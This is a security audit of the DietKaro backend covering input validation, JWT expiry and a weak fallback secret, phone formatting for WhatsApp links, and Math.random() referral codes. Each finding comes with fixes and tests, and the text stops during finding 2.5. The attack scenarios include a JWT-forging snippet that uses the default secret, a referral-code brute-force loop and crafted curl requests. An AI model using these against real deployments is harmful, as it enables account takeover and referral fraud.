# 02 - Security Vulnerabilities

**Audit Date:** 2026-02-14
**Scope:** DietKaro Backend API
**Severity Levels:** HIGH, MEDIUM, LOW

---

## Table of Contents

- [2.1 HIGH: No Org-Scoping on Meal Operations](#21-high-no-org-scoping-on-meal-operations)
- [2.2 HIGH: Client Auth Token Never Expires Properly](#22-high-client-auth-token-never-expires-properly)
- [2.3 HIGH: WhatsApp Share Link Phone Number Handling](#23-high-whatsapp-share-link-phone-number-handling)
- [2.4 MEDIUM: Math.random() Used for Referral Codes](#24-medium-mathrandom-used-for-referral-codes)
- [2.5 MEDIUM: Unused clerkClient Import](#25-medium-unused-clerkclient-import)
- [2.6 MEDIUM: No CORS Configuration Visible](#26-medium-no-cors-configuration-visible)

---

## 2.1 HIGH: No Org-Scoping on Meal Operations

**File:** `backend/src/services/meal.service.ts` (lines 6-44)
**Severity:** HIGH
**Category:** Input Validation / Authorization

### The Problem

The `addMealToPlan` method accepts the `body` parameter typed as `any` with no schema validation. The `mealType` field is accepted as a free-form string and passed directly to Prisma without validation against the `MealType` enum defined in the database schema.

```typescript
// backend/src/services/meal.service.ts:6-44
async addMealToPlan(body: any, orgId: string) {
    const { planId, dayIndex, mealDate, mealType, timeOfDay, title, description, instructions, foodItems } = body;

    if (!planId || !mealType || !title) {
        throw AppError.badRequest('planId, mealType, and title are required', 'MISSING_FIELDS');
    }

    const plan = await prisma.dietPlan.findFirst({ where: { id: planId, orgId } });
    if (!plan) throw AppError.notFound('Diet plan not found', 'PLAN_NOT_FOUND');

    const meal = await prisma.meal.create({
        data: {
            planId,
            dayOfWeek: dayIndex,
            mealDate: mealDate ? new Date(mealDate) : null,
            mealType,       // <-- Free-form string, not validated
            timeOfDay,
            name: title,
            description,
            instructions,
            foodItems: foodItems?.length
                ? {
                      create: foodItems.map((item: any, sortOrder: number) => ({
                          foodId: item.foodId,
                          quantityG: item.quantity,
                          notes: item.notes,
                          sortOrder,
                          optionGroup: item.optionGroup ?? 0,
                          optionLabel: item.optionLabel ?? null,
                      })),
                  }
                : undefined,
        },
        include: { foodItems: { orderBy: [{ optionGroup: 'asc' }, { sortOrder: 'asc' }], include: { foodItem: true } } },
    });

    logger.info('Meal added to plan', { mealId: meal.id, planId });
    return meal;
}
```

The Prisma schema defines the following valid values:

```prisma
enum MealType {
  breakfast
  lunch
  snack
  dinner
}
```

### Why It's Dangerous

1. **Prisma Runtime Error:** Sending an invalid `mealType` value (e.g., `"brunch"`, `"midnight_snack"`, or `"<script>alert(1)</script>"`) will cause an unhandled Prisma validation error at the database layer rather than a clean 400 response. This leaks internal error details to the client.

2. **Untyped Body (`any`):** Because the entire `body` is typed as `any`, TypeScript provides zero compile-time safety. Fields like `dayIndex`, `timeOfDay`, `description`, `instructions`, and the `foodItems` array are all accepted without shape or type validation. An attacker could pass unexpected properties that get spread into the Prisma `create` call.

3. **foodItems Sub-objects:** Each item in the `foodItems` array is also typed as `any`. There is no validation that `foodId` is a valid UUID, that `quantity` is a positive number, or that `optionGroup` is an integer.

### Attack Scenarios

**Scenario 1: Invalid enum causes 500 error**
```bash
curl -X POST /api/v1/meals \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "planId": "valid-plan-id",
    "mealType": "invalid_type",
    "title": "Test"
  }'
# Response: 500 Internal Server Error with Prisma error details
```

**Scenario 2: Malformed foodItems causes database constraint violations**
```bash
curl -X POST /api/v1/meals \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "planId": "valid-plan-id",
    "mealType": "breakfast",
    "title": "Test",
    "foodItems": [
      { "foodId": "nonexistent-uuid", "quantity": -100, "notes": null }
    ]
  }'
# Response: 500 with foreign key constraint or validation error
```

**Scenario 3: Extra properties in body**
```bash
curl -X POST /api/v1/meals \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "planId": "valid-plan-id",
    "mealType": "breakfast",
    "title": "Test",
    "id": "attacker-controlled-id",
    "createdAt": "2020-01-01"
  }'
# Prisma ignores unknown fields, but it signals lack of defensive coding
```

### The Fix

Create a Zod validation schema and validate `mealType` against the Prisma `MealType` enum. Apply the schema at the service layer or (preferably) as route-level middleware.

**Step 1: Create or extend the meal validation schema**

```typescript
// backend/src/schemas/meal.schema.ts
import { z } from 'zod';

// Mirror the Prisma MealType enum
const MealTypeEnum = z.enum(['breakfast', 'lunch', 'snack', 'dinner']);

const foodItemSchema = z.object({
    foodId: z.string().uuid('foodId must be a valid UUID'),
    quantity: z.number().positive('Quantity must be a positive number'),
    notes: z.string().max(500).optional().nullable(),
    optionGroup: z.number().int().min(0).default(0),
    optionLabel: z.string().max(100).optional().nullable(),
});

export const addMealSchema = z.object({
    planId: z.string().uuid('planId must be a valid UUID'),
    dayIndex: z.number().int().min(0).max(6).optional().nullable(),
    mealDate: z.string().datetime().optional().nullable(),
    mealType: MealTypeEnum,
    timeOfDay: z.string().max(20).optional().nullable(),
    title: z.string().min(1, 'Title is required').max(200),
    description: z.string().max(2000).optional().nullable(),
    instructions: z.string().max(5000).optional().nullable(),
    foodItems: z.array(foodItemSchema).optional(),
});

export type AddMealInput = z.infer<typeof addMealSchema>;
```

**Step 2: Update the service to use the typed input**

```typescript
// backend/src/services/meal.service.ts
import prisma from '../utils/prisma';
import { AppError } from '../errors/AppError';
import logger from '../utils/logger';
import { AddMealInput, addMealSchema } from '../schemas/meal.schema';

export class MealService {
    async addMealToPlan(body: unknown, orgId: string) {
        // Validate and parse the input
        const parseResult = addMealSchema.safeParse(body);
        if (!parseResult.success) {
            const messages = parseResult.error.errors.map(e => `${e.path.join('.')}: ${e.message}`).join('; ');
            throw AppError.badRequest(`Validation failed: ${messages}`, 'VALIDATION_ERROR');
        }

        const { planId, dayIndex, mealDate, mealType, timeOfDay, title, description, instructions, foodItems } = parseResult.data;

        const plan = await prisma.dietPlan.findFirst({ where: { id: planId, orgId } });
        if (!plan) throw AppError.notFound('Diet plan not found', 'PLAN_NOT_FOUND');

        const meal = await prisma.meal.create({
            data: {
                planId,
                dayOfWeek: dayIndex ?? null,
                mealDate: mealDate ? new Date(mealDate) : null,
                mealType,       // Now guaranteed to be a valid MealType enum value
                timeOfDay: timeOfDay ?? null,
                name: title,
                description: description ?? null,
                instructions: instructions ?? null,
                foodItems: foodItems?.length
                    ? {
                          create: foodItems.map((item, sortOrder) => ({
                              foodId: item.foodId,
                              quantityG: item.quantity,
                              notes: item.notes ?? null,
                              sortOrder,
                              optionGroup: item.optionGroup,
                              optionLabel: item.optionLabel ?? null,
                          })),
                      }
                    : undefined,
            },
            include: { foodItems: { orderBy: [{ optionGroup: 'asc' }, { sortOrder: 'asc' }], include: { foodItem: true } } },
        });

        logger.info('Meal added to plan', { mealId: meal.id, planId });
        return meal;
    }

    // ... rest of the service
}
```

### Testing Steps

1. **Valid request succeeds:**
   - Send a POST with `mealType: "breakfast"` and all required fields. Expect 201/200.

2. **Invalid mealType returns 400:**
   - Send `mealType: "brunch"`. Expect 400 with `"Validation failed"` message, not a 500.
   - Send `mealType: ""`. Expect 400.
   - Send `mealType: 123`. Expect 400.

3. **Missing required fields return 400:**
   - Omit `planId`. Expect 400.
   - Omit `title`. Expect 400.
   - Omit `mealType`. Expect 400.

4. **Invalid foodItems are rejected:**
   - Send `foodItems: [{ "foodId": "not-a-uuid", "quantity": -5 }]`. Expect 400.
   - Send `foodItems: [{ "foodId": "valid-uuid" }]` (missing quantity). Expect 400.

5. **Org-scoping still works:**
   - Send a valid `planId` that belongs to a different org. Expect 404 `PLAN_NOT_FOUND`.

---

## 2.2 HIGH: Client Auth Token Never Expires Properly

**File:** `backend/src/middleware/clientAuth.middleware.ts` (lines 70-72)
**Severity:** HIGH
**Category:** Authentication / Session Management

### The Problem

The client authentication system issues JWT tokens with a 30-day expiry, no refresh token mechanism, no token rotation, and no revocation or blacklisting capability.

```typescript
// backend/src/middleware/clientAuth.middleware.ts:70-72
export const signClientToken = (clientId: string): string => {
    return jwt.sign({ clientId }, JWT_SECRET, { expiresIn: '30d' });
};
```

The token is issued once during OTP verification and never rotated:

```typescript
// backend/src/controllers/clientAuth.controller.ts:87-88
// Generate JWT
const token = signClientToken(client.id);
```

The middleware does perform an `isActive` check on every request:

```typescript
// backend/src/middleware/clientAuth.middleware.ts:46
if (!client || !client.isActive) {
    return res.status(401).json({
        success: false,
        error: { code: 'UNAUTHORIZED', message: 'Invalid or inactive client' },
    });
}
```

However, this only partially mitigates the issue. There is no way to invalidate a specific token -- only the entire client account can be deactivated.

Additionally, the JWT secret has a weak fallback default:

```typescript
// backend/src/middleware/clientAuth.middleware.ts:15
const JWT_SECRET = process.env.CLIENT_JWT_SECRET || 'client-secret-change-in-production';
```

### Why It's Dangerous

1. **Token Theft Window:** A 30-day window means a stolen token (via XSS, device theft, network interception, or shared device) remains valid for up to a month. The attacker has full access to the client's diet plans, weight logs, and personal health data.

2. **No Granular Revocation:** If a client reports their phone stolen, the only option is to deactivate their entire account. There is no way to invalidate just the compromised token while keeping the account active.

3. **No Token Rotation:** Since the same token is used for 30 days without rotation, there is no mechanism to detect concurrent usage from multiple devices (a sign of compromise).

4. **Weak Default Secret:** If `CLIENT_JWT_SECRET` is not set in the environment, all tokens are signed with the string `'client-secret-change-in-production'`. Anyone who reads this source code (or this audit) can forge valid tokens.

5. **OTP Also Uses Math.random():** The OTP generation (`Math.floor(100000 + Math.random() * 900000)`) is not cryptographically secure, which further weakens the initial authentication step.

### Attack Scenarios

**Scenario 1: Stolen device**
- A client's phone is stolen. The attacker opens the app, which has the 30-day token stored locally.
- The attacker can read all diet plans, weight logs, meal logs, and personal health information for up to 30 days.
- The dietitian must deactivate the entire client account to stop access, disrupting the client's experience.

**Scenario 2: Shared / public device**
- A client logs in on a shared tablet at a clinic. The token persists for 30 days.
- The next person using the device can access the previous client's data.

**Scenario 3: Token exfiltration via XSS (if web client exists)**
- If the token is stored in localStorage and an XSS vulnerability exists, the attacker extracts the token.
- The token works for 30 days from any device, anywhere in the world.

**Scenario 4: Forged tokens with default secret**
- If `CLIENT_JWT_SECRET` is not configured, anyone can create valid tokens:
```javascript
const jwt = require('jsonwebtoken');
const forgedToken = jwt.sign(
    { clientId: 'target-client-uuid' },
    'client-secret-change-in-production',
    { expiresIn: '30d' }
);
// This token will pass all middleware checks
```

### The Fix

Implement short-lived access tokens (15 minutes) with a longer-lived refresh token (7 days), token rotation on each refresh, and a token family mechanism for revocation.

**Step 1: Add a refresh token table to the Prisma schema**

```prisma
// backend/prisma/schema.prisma (add this model)
model ClientRefreshToken {
  id           String   @id @default(uuid())
  clientId     String
  tokenHash    String   @unique          // SHA-256 hash of the refresh token
  familyId     String                    // Token family for rotation detection
  expiresAt    DateTime
  isRevoked    Boolean  @default(false)
  createdAt    DateTime @default(now())

  client       Client   @relation(fields: [clientId], references: [id], onDelete: Cascade)

  @@index([clientId])
  @@index([familyId])
}
```

**Step 2: Rewrite the token signing and refresh logic**

```typescript
// backend/src/middleware/clientAuth.middleware.ts
import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';
import crypto from 'crypto';
import prisma from '../utils/prisma';

export interface ClientAuthRequest extends Request {
    client?: {
        id: string;
        fullName: string;
        phone: string;
        email: string;
        orgId: string;
    };
}

const JWT_SECRET = process.env.CLIENT_JWT_SECRET;
if (!JWT_SECRET) {
    throw new Error('CLIENT_JWT_SECRET environment variable is required');
}

const ACCESS_TOKEN_EXPIRY = '15m';   // 15 minutes
const REFRESH_TOKEN_EXPIRY_DAYS = 7;

/**
 * Hash a refresh token for storage (never store raw tokens).
 */
function hashToken(token: string): string {
    return crypto.createHash('sha256').update(token).digest('hex');
}

/**
 * Generate a cryptographically secure refresh token.
 */
function generateRefreshToken(): string {
    return crypto.randomBytes(48).toString('base64url');
}

/**
 * Sign a short-lived access token.
 */
export function signClientAccessToken(clientId: string): string {
    return jwt.sign({ clientId, type: 'access' }, JWT_SECRET!, { expiresIn: ACCESS_TOKEN_EXPIRY });
}

/**
 * Create a new refresh token and store its hash in the database.
 * Returns the raw refresh token (to be sent to the client).
 */
export async function createRefreshToken(clientId: string, familyId?: string): Promise<string> {
    const rawToken = generateRefreshToken();
    const tokenHash = hashToken(rawToken);
    const family = familyId || crypto.randomUUID();

    const expiresAt = new Date();
    expiresAt.setDate(expiresAt.getDate() + REFRESH_TOKEN_EXPIRY_DAYS);

    await prisma.clientRefreshToken.create({
        data: {
            clientId,
            tokenHash,
            familyId: family,
            expiresAt,
        },
    });

    // Encode family info into the token for rotation detection
    return `${family}:${rawToken}`;
}

/**
 * Rotate a refresh token: validate the old one, revoke it, issue a new one.
 * If a revoked token from the same family is reused, revoke ALL tokens in the family (theft detection).
 */
export async function rotateRefreshToken(rawCompoundToken: string): Promise<{
    accessToken: string;
    refreshToken: string;
    clientId: string;
} | null> {
    const [familyId, rawToken] = rawCompoundToken.split(':');
    if (!familyId || !rawToken) return null;

    const tokenHash = hashToken(rawToken);

    const storedToken = await prisma.clientRefreshToken.findUnique({
        where: { tokenHash },
    });

    if (!storedToken) return null;

    // If this token was already revoked, it means the family is compromised.
    // Revoke ALL tokens in the family (theft detection).
    if (storedToken.isRevoked) {
        await prisma.clientRefreshToken.updateMany({
            where: { familyId: storedToken.familyId },
            data: { isRevoked: true },
        });
        return null;
    }

    // Check expiry
    if (storedToken.expiresAt < new Date()) {
        await prisma.clientRefreshToken.update({
            where: { id: storedToken.id },
            data: { isRevoked: true },
        });
        return null;
    }

    // Revoke the current token (it has been used)
    await prisma.clientRefreshToken.update({
        where: { id: storedToken.id },
        data: { isRevoked: true },
    });

    // Issue new token pair (same family)
    const newRefreshToken = await createRefreshToken(storedToken.clientId, storedToken.familyId);
    const accessToken = signClientAccessToken(storedToken.clientId);

    return {
        accessToken,
        refreshToken: newRefreshToken,
        clientId: storedToken.clientId,
    };
}

/**
 * Revoke all refresh tokens for a client (e.g., on logout or account compromise).
 */
export async function revokeAllClientTokens(clientId: string): Promise<void> {
    await prisma.clientRefreshToken.updateMany({
        where: { clientId, isRevoked: false },
        data: { isRevoked: true },
    });
}

/**
 * Middleware: require a valid access token on every request.
 */
export const requireClientAuth = async (
    req: ClientAuthRequest,
    res: Response,
    next: NextFunction
) => {
    try {
        const authHeader = req.headers.authorization;
        if (!authHeader?.startsWith('Bearer ')) {
            return res.status(401).json({
                success: false,
                error: { code: 'UNAUTHORIZED', message: 'No token provided' },
            });
        }

        const token = authHeader.split(' ')[1];
        const decoded = jwt.verify(token, JWT_SECRET!) as { clientId: string; type: string };

        if (decoded.type !== 'access') {
            return res.status(401).json({
                success: false,
                error: { code: 'UNAUTHORIZED', message: 'Invalid token type' },
            });
        }

        const client = await prisma.client.findUnique({
            where: { id: decoded.clientId },
            select: {
                id: true,
                fullName: true,
                phone: true,
                email: true,
                orgId: true,
                isActive: true,
            },
        });

        if (!client || !client.isActive) {
            return res.status(401).json({
                success: false,
                error: { code: 'UNAUTHORIZED', message: 'Invalid or inactive client' },
            });
        }

        req.client = {
            id: client.id,
            fullName: client.fullName,
            phone: client.phone,
            email: client.email,
            orgId: client.orgId,
        };

        next();
    } catch (error) {
        return res.status(401).json({
            success: false,
            error: { code: 'UNAUTHORIZED', message: 'Invalid or expired token' },
        });
    }
};
```

**Step 3: Update the auth controller to issue token pairs**

```typescript
// backend/src/controllers/clientAuth.controller.ts (verifyOTP handler, updated section)
import { signClientAccessToken, createRefreshToken, rotateRefreshToken, revokeAllClientTokens } from '../middleware/clientAuth.middleware';

// Inside verifyOTP, replace the token generation:
const accessToken = signClientAccessToken(client.id);
const refreshToken = await createRefreshToken(client.id);

res.status(200).json({
    success: true,
    data: {
        accessToken,
        refreshToken,
        expiresIn: 900, // 15 minutes in seconds
        client: { /* ... existing fields ... */ },
    },
});
```

**Step 4: Add a refresh endpoint**

```typescript
// backend/src/controllers/clientAuth.controller.ts (new endpoint)
export const refreshClientToken = asyncHandler(async (req: Request, res: Response) => {
    const { refreshToken } = req.body;
    if (!refreshToken) {
        throw AppError.badRequest('Refresh token required', 'MISSING_REFRESH_TOKEN');
    }

    const result = await rotateRefreshToken(refreshToken);
    if (!result) {
        throw AppError.unauthorized('Invalid or expired refresh token');
    }

    res.status(200).json({
        success: true,
        data: {
            accessToken: result.accessToken,
            refreshToken: result.refreshToken,
            expiresIn: 900,
        },
    });
});

// Add a logout endpoint
export const logoutClient = asyncHandler(async (req: ClientAuthRequest, res: Response) => {
    if (!req.client) throw AppError.unauthorized();

    await revokeAllClientTokens(req.client.id);

    res.status(200).json({
        success: true,
        message: 'Logged out successfully',
    });
});
```

**Step 5: Register the new routes**

```typescript
// backend/src/routes/clientAuth.routes.ts (add these)
router.post('/refresh', refreshClientToken);
router.post('/logout', requireClientAuth, logoutClient);
```

### Testing Steps

1. **Login issues short-lived access token:**
   - Call `POST /api/v1/client-auth/verify-otp` with valid credentials.
   - Decode the returned `accessToken` and verify `exp` is ~15 minutes from now.
   - Verify the response includes a `refreshToken`.

2. **Access token expires correctly:**
   - Wait 15 minutes (or set `ACCESS_TOKEN_EXPIRY` to `'5s'` for testing).
   - Make an authenticated request. Expect 401 `"Invalid or expired token"`.

3. **Refresh token rotation works:**
   - Call `POST /api/v1/client-auth/refresh` with the refresh token.
   - Expect a new `accessToken` and a new `refreshToken`.
   - Verify the old refresh token no longer works (returns 401 on second use).

4. **Reuse detection invalidates entire family:**
   - Save a refresh token, use it once to get a new pair.
   - Try to use the old (now-revoked) refresh token again.
   - Expect 401 -- and verify that the new refresh token is also now revoked.

5. **Logout revokes all tokens:**
   - Call `POST /api/v1/client-auth/logout`.
   - Attempt to use the refresh token. Expect 401.

6. **Missing CLIENT_JWT_SECRET prevents startup:**
   - Unset `CLIENT_JWT_SECRET` and start the server.
   - Expect the process to throw `"CLIENT_JWT_SECRET environment variable is required"`.

---

## 2.3 HIGH: WhatsApp Share Link Phone Number Handling

**File:** `backend/src/controllers/share.controller.ts` (line 218)
**Severity:** HIGH
**Category:** Data Integrity / Broken Functionality

### The Problem

The WhatsApp share link construction has multiple issues with phone number handling:

```typescript
// backend/src/controllers/share.controller.ts:218
const whatsappLink = `https://wa.me/${plan.client?.phone?.replace(/[^0-9]/g, '') || ''}?text=${encodeURIComponent(message)}`;
```

Three distinct problems:

1. **Null/undefined phone generates a broken link:** If `plan.client` is `null` (no client assigned) or `plan.client.phone` is `null`/`undefined`, the expression evaluates to an empty string, producing: `https://wa.me/?text=...`. This is a broken WhatsApp link that leads to the WhatsApp home page or an error.

2. **No country code prefix:** Indian phone numbers stored as `"9876543210"` (10 digits) are used as-is. The WhatsApp API (`wa.me`) requires the full international number including country code. Without the `91` prefix, the link will either fail or target the wrong number in a different country.

3. **No phone format validation:** Phone numbers stored with spaces, dashes, or parentheses (e.g., `"+91 98765-43210"`) are stripped to digits, but there is no validation that the result is a legitimate phone number length or format.

### Why It's Dangerous

1. **User Experience Failure:** Dietitians clicking "Share via WhatsApp" will get a broken or incorrect WhatsApp link, making a core feature non-functional. This is a HIGH severity business impact.

2. **Message Sent to Wrong Recipient:** Without the country code, a 10-digit number like `9876543210` could match a number in a different country. A client's personal health data (diet plan, weight targets, calorie goals) would be sent to a stranger.

3. **Silent Failure:** The API returns a 200 success response with the broken link. There is no error or warning to the dietitian that the link is invalid. The `clientPhone` field is returned in the response but no validation occurs.

### Attack Scenarios

**Scenario 1: Plan without client**
```bash
# A draft diet plan with no client assigned
curl -GET /api/v1/share/plan-without-client/whatsapp \
  -H "Authorization: Bearer <token>"

# Response (200 OK):
{
  "success": true,
  "data": {
    "whatsappLink": "https://wa.me/?text=...",  // Broken link
    "clientPhone": null
  }
}
```

**Scenario 2: Indian phone without country code**
```bash
# Client phone stored as "9876543210"
# Generated link: https://wa.me/9876543210?text=...
# WhatsApp interprets this as country code 98 (Iran), not 91 (India)
```

**Scenario 3: Phone stored with formatting**
```bash
# Client phone stored as "+91-98765 43210"
# After regex: "919876543210" -- this works correctly
# But if stored as "098765-43210" (with leading 0 trunk prefix):
# After regex: "09876543210" -- broken, leading 0 is not valid in E.164
```

### The Fix

Validate the phone number, ensure the country code is present, and return an error if the phone is missing or invalid.

```typescript
// backend/src/controllers/share.controller.ts (updated getDietPlanShareLink)
export const getDietPlanShareLink = asyncHandler(async (req: AuthenticatedRequest, res: Response) => {
    if (!req.user) throw AppError.unauthorized();

    const { id } = req.params;

    const plan = await prisma.dietPlan.findFirst({
        where: { id, orgId: req.user.organizationId, isActive: true },
        include: {
            client: { select: { fullName: true, phone: true } }
        }
    });

    if (!plan) throw AppError.notFound('Diet plan not found');

    // --- Phone number validation and formatting ---
    const rawPhone = plan.client?.phone;
    if (!rawPhone) {
        throw AppError.badRequest(
            'Cannot generate WhatsApp link: client has no phone number on file',
            'MISSING_PHONE'
        );
    }

    const formattedPhone = formatPhoneForWhatsApp(rawPhone);
    if (!formattedPhone) {
        throw AppError.badRequest(
            'Cannot generate WhatsApp link: client phone number is invalid',
            'INVALID_PHONE'
        );
    }

    // Generate summary message for WhatsApp
    const message = `*${plan.name}*

Hi ${plan.client?.fullName || 'there'}!

Your personalized diet plan is ready.

Daily Targets:
${plan.targetCalories ? `- Calories: ${plan.targetCalories} kcal` : ''}
${plan.targetProteinG ? `- Protein: ${plan.targetProteinG}g` : ''}
${plan.targetCarbsG ? `- Carbs: ${plan.targetCarbsG}g` : ''}
${plan.targetFatsG ? `- Fats: ${plan.targetFatsG}g` : ''}

Open the DietKaro app to view your complete meal plan!

Best regards,
Your Dietitian at DietKaro`;

    const whatsappLink = `https://wa.me/${formattedPhone}?text=${encodeURIComponent(message)}`;

    res.status(200).json({
        success: true,
        data: {
            message,
            whatsappLink,
            clientPhone: plan.client?.phone,
            formattedPhone,
        }
    });
});

/**
 * Format a phone number for the WhatsApp wa.me API.
 *
 * Rules:
 * - Strip all non-digit characters
 * - Remove leading trunk prefix '0' if present after country code stripping
 * - If the result is 10 digits, assume Indian number and prepend '91'
 * - If the result starts with '91' and is 12 digits, use as-is
 * - Validate final length is between 10-15 digits (E.164 range)
 * - Return null if the number is invalid
 *
 * The default country code can be made configurable per org in the future.
 */
function formatPhoneForWhatsApp(phone: string, defaultCountryCode: string = '91'): string | null {
    // Strip all non-digit characters
    let digits = phone.replace(/[^0-9]/g, '');

    if (digits.length === 0) return null;

    // Remove leading '0' trunk prefix (common in Indian dialing: 09876543210)
    if (digits.startsWith('0')) {
        digits = digits.substring(1);
    }

    // If 10 digits, assume local number -- prepend default country code
    if (digits.length === 10) {
        digits = defaultCountryCode + digits;
    }

    // If it starts with '+' equivalent (already has country code), verify length
    // E.164: country code (1-3 digits) + subscriber number = 10-15 total digits
    if (digits.length < 10 || digits.length > 15) {
        return null;
    }

    return digits;
}
```

### Testing Steps

1. **Valid Indian phone number (10 digits):**
   - Client phone: `"9876543210"`.
   - Expect `whatsappLink` containing `https://wa.me/919876543210?text=...`.

2. **Phone with country code already present:**
   - Client phone: `"+91-98765-43210"`.
   - Expect link containing `919876543210`.

3. **Phone with leading zero (trunk prefix):**
   - Client phone: `"09876543210"`.
   - Expect `0` removed, country code prepended: `919876543210`.

4. **Null phone returns 400:**
   - Create a plan with no client assigned or a client with no phone.
   - Call the share endpoint. Expect 400 with `MISSING_PHONE` error code.

5. **Invalid phone returns 400:**
   - Client phone: `"abc"` or `"123"`.
   - Expect 400 with `INVALID_PHONE` error code.

6. **International number preserved:**
   - Client phone: `"+44 7911 123456"` (UK).
   - Expect link containing `447911123456` (country code preserved, no `91` added).

---

## 2.4 MEDIUM: Math.random() Used for Referral Codes

**File:** `backend/src/services/client.service.ts` (lines 14-20)
**Severity:** MEDIUM
**Category:** Cryptographic Weakness

### The Problem

Referral codes are generated using `Math.random()`, which is not a cryptographically secure pseudorandom number generator (CSPRNG).

```typescript
// backend/src/services/client.service.ts:9-20
const REFERRAL_CHARS = 'ABCDEFGHJKMNPQRSTUVWXYZ23456789';
const REFERRAL_CODE_LENGTH = 6;
const MAX_REFERRAL_ATTEMPTS = 10;
const REFERRALS_PER_FREE_MONTH = 3;

function generateReferralCode(): string {
    let code = '';
    for (let i = 0; i < REFERRAL_CODE_LENGTH; i++) {
        code += REFERRAL_CHARS.charAt(Math.floor(Math.random() * REFERRAL_CHARS.length));
    }
    return code;
}
```

The character set has 30 characters and codes are 6 characters long, giving 30^6 = 729,000,000 possible codes. However, `Math.random()` uses a PRNG (typically xorshift128+ in V8) that is seeded from a predictable source and whose internal state can be reconstructed from observed outputs.

Additionally, the fallback in `generateUniqueReferralCode` further weakens uniqueness:

```typescript
// backend/src/services/client.service.ts:31
return generateReferralCode() + Date.now().toString(36).slice(-2).toUpperCase();
```

This appends two characters derived from `Date.now()`, which is predictable.

### Why It's Dangerous

1. **Referral Code Prediction:** If referral codes provide benefits (the code shows `REFERRALS_PER_FREE_MONTH = 3`, meaning 3 referrals = 1 free month), an attacker who can predict or brute-force referral codes could fraudulently trigger referral benefits.

2. **PRNG State Recovery:** Given enough observed referral codes (approximately 4-5 sequential outputs), an attacker can reconstruct the full internal state of V8's `Math.random()` using known techniques (e.g., z3 SMT solver). They can then predict all future referral codes.

3. **Enumeration:** With only 729 million possible codes and no rate limiting on referral code lookup, an attacker could potentially enumerate valid codes through the API.

### Attack Scenarios

**Scenario 1: Brute-force referral codes for free months**
```javascript
// 30^6 = 729M codes, but only a fraction are active.
// If 10,000 clients exist, that is a 1-in-72,900 chance per guess.
// At 100 requests/second with no rate limiting, an attacker finds a valid code
// in ~12 minutes on average.
const chars = 'ABCDEFGHJKMNPQRSTUVWXYZ23456789';
for (let i = 0; i < 729_000_000; i++) {
    const code = /* generate sequential code */;
    await fetch(`/api/v1/clients`, {
        method: 'POST',
        body: JSON.stringify({ referralCode: code, /* ... */ })
    });
}
```

**Scenario 2: PRNG state reconstruction**
```python
# Using z3 or similar solver with 4-5 known Math.random() outputs,
# reconstruct the xorshift128+ state and predict all future codes.
# This is a well-documented attack against Math.random().
```

### The Fix

Replace `Math.random()` with Node.js `crypto` module functions.

```typescript
// backend/src/services/client.service.ts (updated)
import crypto from 'crypto';

const REFERRAL_CHARS = 'ABCDEFGHJKMNPQRSTUVWXYZ23456789';
const REFERRAL_CODE_LENGTH = 6;
const MAX_REFERRAL_ATTEMPTS = 10;
const REFERRALS_PER_FREE_MONTH = 3;

/**
 * Generate a cryptographically secure referral code.
 *
 * Uses crypto.randomInt() which is backed by the OS CSPRNG
 * and provides uniform distribution without modulo bias.
 */
function generateReferralCode(): string {
    let code = '';
    for (let i = 0; i < REFERRAL_CODE_LENGTH; i++) {
        const index = crypto.randomInt(REFERRAL_CHARS.length);
        code += REFERRAL_CHARS.charAt(index);
    }
    return code;
}
```

This is a one-line change per character generation. `crypto.randomInt(max)` returns a uniform random integer in `[0, max)` using a cryptographically secure source. It avoids modulo bias internally.

If your Node.js version predates `crypto.randomInt()` (added in Node 14.10.0), use this alternative:

```typescript
function generateReferralCode(): string {
    const bytes = crypto.randomBytes(REFERRAL_CODE_LENGTH);
    let code = '';
    for (let i = 0; i < REFERRAL_CODE_LENGTH; i++) {
        // Use rejection sampling to avoid modulo bias
        // 256 / 30 = 8.53, so values 0-239 map cleanly to 0-29 (8 each)
        // Values 240-255 are rejected (re-rolled)
        let byte = bytes[i];
        while (byte >= 240) {
            byte = crypto.randomBytes(1)[0];
        }
        code += REFERRAL_CHARS.charAt(byte % REFERRAL_CHARS.length);
    }
    return code;
}
```

Also fix the OTP generation in `clientAuth.controller.ts` while you are at it:

```typescript
// backend/src/controllers/clientAuth.controller.ts (updated)
import crypto from 'crypto';

const generateOTP = (): string => {
    return crypto.randomInt(100000, 1000000).toString();
};
```

### Testing Steps

1. **Referral codes still generate correctly:**
   - Create a client. Verify the returned `referralCode` is 6 characters, all from the allowed character set.

2. **Codes are unique:**
   - Generate 10,000 codes in a test. Verify no duplicates (the uniqueness check + retry logic should handle this, but verify the raw generation has sufficient entropy).

3. **Statistical distribution:**
   - Generate 100,000 codes and count character frequencies. With 30 characters and 6 positions, each character should appear approximately 100000 * 6 / 30 = 20,000 times. Verify no character has a frequency deviating by more than 5% from the expected value.

4. **No Math.random() in codebase:**
   - Run `grep -r "Math.random()" backend/src/` and verify the only remaining usages are in non-security-sensitive contexts (if any).

---

## 2.5 MEDIUM: Unused clerkClient Import

**File:** `backend/src/middleware/auth.middleware.ts` (line 2)
**Severity:** MEDIUM (LOW security impact, MEDIUM code quality impact)
**Category:** Dead Code / Code Hygiene

### The Problem

The `clerkClient` named import is imported but never used anywhere in the file.

```typescript
// backend/src/middleware/auth.middleware.ts:2
import { clerkClient, getAuth } from '@clerk/express';
```

Only `getAuth` is used in the middleware (line 17):

```typescript
// backend/src/middleware/auth.middleware.ts:17
const auth = getAuth(req);
```

A search of the file confirms `clerkClient` appears only on the import line.

### Why It's Dangerous

This is primarily a code quality issue rather than a direct security vulnerability:

1. **Increased Attack Surface (Theoretical):** `clerkClient` is the Clerk admin SDK client, capable of managing users, sessions, and organizations. While importing it does not expose it, the unused import signals that someone may have intended to use admin-level Clerk operations in this middleware. If a future developer sees the import and starts using it without understanding the implications, it could lead to privilege escalation (e.g., modifying other users' sessions from middleware).

2. **Bundle Size:** Depending on tree-shaking behavior, unused imports may pull additional code into the server bundle. For `@clerk/express`, the `clerkClient` export may trigger initialization of the admin API client.

3. **Misleading Code:** Developers reading this middleware might assume `clerkClient` is used somewhere, leading to confusion during debugging or refactoring.

4. **Linting Failures:** This would trigger `no-unused-vars` (or `@typescript-eslint/no-unused-vars`) in a properly configured linter, indicating the project may not have linting enforced in CI.

### The Fix

Remove the unused import.

```typescript
// backend/src/middleware/auth.middleware.ts:2 (before)
import { clerkClient, getAuth } from '@clerk/express';

